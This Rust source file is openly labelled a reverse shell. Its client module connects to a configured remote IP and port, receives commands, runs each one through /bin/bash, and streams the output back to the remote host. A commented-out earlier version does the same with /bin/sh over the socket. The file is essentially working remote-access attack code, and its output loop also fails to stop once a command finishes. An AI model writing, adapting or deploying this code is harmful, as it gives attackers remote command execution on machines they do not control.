/*

A reverse shell written in Rust.
Copyright (C) 2022-2023 simonfalke, Sherlock Holmes, Admiral Canaris

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.

*/

pub mod client {
	use crate::Config;
	use duct::cmd;
	use std::io::BufReader;
	use std::io::{Read, Write};
	use std::net::TcpStream;

	fn run_command(stream: &mut TcpStream, command: &String) -> String {
		let command = cmd!("/bin/bash", "-c", command);
		let mut reader = BufReader::new(command.stderr_to_stdout().reader().unwrap());

		loop {
			let mut buffer = [0; 1024];
			let bytes = reader.read(&mut buffer).unwrap();

			if bytes == 0 {
				finish_output(stream);
			}

			let output = String::from_utf8_lossy(&buffer[..]).replace("\0", "");
			println!("{}", output);
			send_partial_output(stream, &output);
		}
	}

	fn send_message(stream: &mut TcpStream, message: &String) {
		stream.write(message.as_bytes()).unwrap();
		stream.flush().unwrap();
	}

	fn send_partial_output(stream: &mut TcpStream, output: &String) {
		send_message(stream, output);
		send_message(stream, &String::from("MESSAGEDONE"));
	}

	fn finish_output(stream: &mut TcpStream) {
		send_message(stream, &String::from("END"));
	}

	fn receive_message(stream: &mut TcpStream) -> String {
		let mut buffer = [0; 1024];
		stream.read(&mut buffer).unwrap();

		String::from_utf8_lossy(&buffer[..]).replace("\0", "")
	}

	pub fn main(conf: Config) {
		let mut stream = TcpStream::connect(format!("{}:{}", conf.ip, conf.port)).unwrap();

		loop {
			let command = receive_message(&mut stream).trim().to_string();
			run_command(&mut stream, &command);
		}
	}

	// Preserve previous code first
	/*pub fn client_main(conf: Config) {
	   // Connect to the remote host and get a TcpStream
	   let mut stream = TcpStream::connect(format!("{}:{}", conf.ip, conf.port)).unwrap();

	   // Set up a pipe to read from stdin and write to the TcpStream
	   let stdin = std::io::stdin();
	   let mut stdout = std::io::stdout();

	   // Spawn a new process to execute a shell
	   let mut process = Command::new("/bin/sh")
		  .stdin(Stdio::piped())
		  .stdout(Stdio::piped())
		  .spawn()
		  .unwrap();

	   // Set up a pipe to read from the TcpStream and write to the process's stdin
	   let mut process_stdin = process.stdin.take().unwrap();
	   let mut process_stdout = process.stdout.take().unwrap();

	   // Start a loop to transfer data between the TcpStream and the process
	   loop {
		  let mut buffer = [0; 1024];

		  // Read from the TcpStream
		  let n = stream.read(&mut buffer).unwrap();
		  if n == 0 {
			 break;
		  }

		  // Write to the process's stdin
		  process_stdin.write_all(&buffer[..n]).unwrap();

		  // Read from the process's stdout
		  let n = process_stdout.read(&mut buffer).unwrap();
		  if n == 0 {
			 break;
		  }
		  // Write to the TcpStream
		  stdout.write_all(&buffer[..n]).unwrap();
		  stream.write_all(&buffer[..n]).unwrap();
		  stream.flush().unwrap();
		  stream.write_all(b"\nMESSAGEDONE").unwrap();
		  stream.flush().unwrap();
		  stdout.flush().unwrap();
	   }
	}*/
}
